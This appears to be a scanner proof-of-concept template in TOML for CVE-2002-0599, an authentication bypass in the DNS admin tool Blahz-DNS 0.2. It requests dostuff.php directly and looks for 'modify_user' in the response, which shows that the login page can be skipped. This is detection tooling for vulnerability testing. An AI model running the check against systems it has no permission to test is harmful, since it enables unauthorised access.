[info]
author = "ave"
description = "利用Blahz-DNS 0.2认证绕过漏洞，远程攻击者可直接请求CGI程序（如dostuff.php）绕过登录界面，直接修改系统配置，实现对DNS管理工具的完全未授权访问。"
id = "POC-AVE-2002-0349"
name = "Blahz-DNS 0.2 认证绕过漏洞"
severity = "critical"
tags = ["ave-2002-0349"]
vuln_id = [
    "CVE-2002-0599",
    "AVE-2002-0349",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/dostuff.php"
protocol = "http"

[poc.requests.headers]
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["modify_user"]
